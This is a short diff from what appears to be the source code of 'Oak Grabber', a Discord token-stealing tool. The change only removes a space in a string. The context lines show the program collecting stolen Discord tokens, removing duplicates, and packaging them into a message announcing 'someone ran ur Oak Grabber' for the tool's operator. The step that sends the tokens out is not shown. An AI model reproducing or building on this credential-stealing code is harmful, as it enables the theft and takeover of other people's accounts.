@@ -221,7 +221,7 @@ def main():
                 if token in checked:
                     continue
                 checked.append(token)
-                dctokens+=(f"""{token} \n\n""")
+                dctokens+=(f"""{token}\n\n""")
                 embedMsg = f"""**someone ran ur Oak Grabber <:wiseoaktree:1035527213543596062>**\n\n**Tokens:** ```{dctokens}```"""
         else:
             embedMsg = '''**someone ran ur Oak Grabber <:wiseoaktree:1035527213543596062>**\n\n```No tokens found.```'''
